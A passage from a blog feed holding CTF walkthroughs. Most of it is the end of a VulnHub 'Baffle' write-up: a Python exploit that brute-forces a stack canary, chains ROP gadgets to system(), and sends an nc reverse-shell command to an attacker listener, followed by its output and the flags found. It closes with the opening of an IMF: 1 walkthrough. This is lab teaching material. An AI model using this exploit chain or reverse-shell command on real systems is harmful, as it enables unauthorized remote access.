+&lt;span class=&quot;n&quot;&gt;system_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;libc_base&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;system_libc_offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;[+] sysem() is at: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;hex&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;system_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;[+] Sending payload!!&quot;&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sockFD&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;sockFD&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;A&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;canaryCounter&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;canary&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x00&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# Stage 2: Save string to writable location&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;poprdi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;		&lt;span class=&quot;c&quot;&gt;# pop rdi&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sockFD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;		&lt;span class=&quot;c&quot;&gt;# socket to read from&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;poprsi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;		&lt;span class=&quot;c&quot;&gt;# pop rsi&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x601010&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;		&lt;span class=&quot;c&quot;&gt;# location to write to&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sockFD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;		&lt;span class=&quot;c&quot;&gt;# junk for r15&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read_plt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;		&lt;span class=&quot;c&quot;&gt;# return to read()&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# Stage 3: call system() with location of string&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;poprdi&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x601010&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;pack&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&amp;lt;Q&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;system_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;127.0.0.1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;7979&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;0.1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# Stage 3: send command&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[+] Sending reverse_shell command&quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'/bin/nc 10.0.1.8 443 -e /bin/sh&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x00&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now let’s run it and see what we get!&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bob@baffle:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python exploit.py
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Getting canary offset
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Server response User to query: Checking...
+Don&lt;span class=&quot;s1&quot;&gt;'t know anything about this user.
+
+[+] Canary offset: 1001
+[+] Bruteforcing Canary
+[*] Canary currently: 00
+[*] Canary currently: 0011
+[*] Canary currently: 00111a
+[*] Canary currently: 00111ae2
+[*] Canary currently: 00111ae23d
+[*] Canary currently: 00111ae23d56
+[*] Canary currently: 00111ae23d561c
+[*] Canary currently: 00111ae23d561c63
+[+] Canary found: 00111ae23d561c63
+User to query: Checking...
+Don'&lt;/span&gt;t know anything about this user.
+ �ap��	@ �kp��[gp�P�[p�
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] memset&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; is at:  0x7fee7061f620
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] libc base is at:  0x7fee7059a000
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] sysem&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; is at:  0x7fee705db490
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Sending payload!!
+2824
+Socket fd: 2825
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Sending reverse_shell &lt;span class=&quot;nb&quot;&gt;command&lt;/span&gt;
+
+...SNIP...
+
+root@kali:/mnt/hgfs/kali64# nc &lt;span class=&quot;nt&quot;&gt;-lnvp&lt;/span&gt; 443
+listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
+connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.0.1.8] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.0.1.9] 56791
+&lt;span class=&quot;nb&quot;&gt;id              
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;vulnhub&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;vulnhub&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;vulnhub&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,24&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;cdrom&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,25&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;floppy&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,27&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,29&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;audio&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,30&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;dip&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,44&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;video&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,46&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;plugdev&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;,108&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;netdev&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;pwd&lt;/span&gt;
+/home/vulnhub
+&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt;
+total 40
+drwx------ 3 vulnhub vulnhub 4096 Oct 25 16:49 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+drwxr-xr-x 6 root    root    4096 Oct 20 03:38 ..
+&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt; 1 vulnhub vulnhub    0 Oct 20 03:28 .bash_history
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 vulnhub vulnhub  220 Sep 12 15:05 .bash_logout
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 vulnhub vulnhub 3515 Sep 12 15:05 .bashrc
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 vulnhub vulnhub   45 Oct 25 16:49 flag.txt
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 vulnhub vulnhub  504 Jan  2 06:04 log.txt
+drwxr-xr-x 2 root    root    4096 Oct 25 16:46 .my_loot
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 vulnhub vulnhub  675 Sep 12 15:05 .profile
+&lt;span class=&quot;nt&quot;&gt;-rwx------&lt;/span&gt; 1 vulnhub vulnhub  297 Oct 20 03:21 run_service.sh
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 vulnhub vulnhub   74 Oct 20 02:08 .selected_editor
+
+&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;flag.txt
+Sorry Mario. The flag is &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;another castle.
+
+&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; .my_loot
+
+&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-al&lt;/span&gt;
+total 12
+drwxr-xr-x 2 root    root    4096 Oct 25 16:46 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+drwx------ 3 vulnhub vulnhub 4096 Oct 25 16:49 ..
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 root    root     274 Oct 25 16:46 flag.txt
+
+&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;flag.txt
+
+
+        &lt;span class=&quot;o&quot;&gt;!!!&lt;/span&gt; CONGRATULATIONS &lt;span class=&quot;o&quot;&gt;!!!&lt;/span&gt;
+
+                 .-&lt;span class=&quot;s2&quot;&gt;&quot;-.
+                / 4 4 &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;
+                &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; v _/
+                //   &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\\&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;      
+               ((     ))
+         =======&quot;&quot;===&quot;&quot;=======
+                  |||
+                  '|'
+
+      FLAG{i_tot_i_saw_a_puddy_tat}
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And lastly, the other flag is hidden in the git repo. Look below, I drew an arrow for you.&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;@@&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;@@&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[])&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+
+     &lt;span class=&quot;n&quot;&gt;memset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+     &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;read&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;parse_request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ARSE_REQUEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;---&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;This&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;is&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;
+
+     &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;end&quot;&gt;END&lt;/h2&gt;</content><author><name>T0w3ntum</name></author><summary type="html">This is one of the harder VM’s I’ve worked on in a while and it taught me many new skills! Good job putting this one together vulnhub CTF team!</summary></entry><entry><title type="html">IMF: 1</title><link href="http://localhost:4000/2016-11-06/IMF" rel="alternate" type="text/html" title="IMF: 1" /><published>2016-11-06T00:00:00-05:00</published><updated>2016-11-06T00:00:00-05:00</updated><id>http://localhost:4000/2016-11-06/IMF</id><content type="html" xml:base="http://localhost:4000/2016-11-06/IMF">&lt;h2 id=&quot;imf-1-walkthrough&quot;&gt;IMF: 1 Walkthrough&lt;/h2&gt;
 
 &lt;p&gt;As always, let’s start off with some enumeration to see what we are dealing with here.&lt;/p&gt;
 
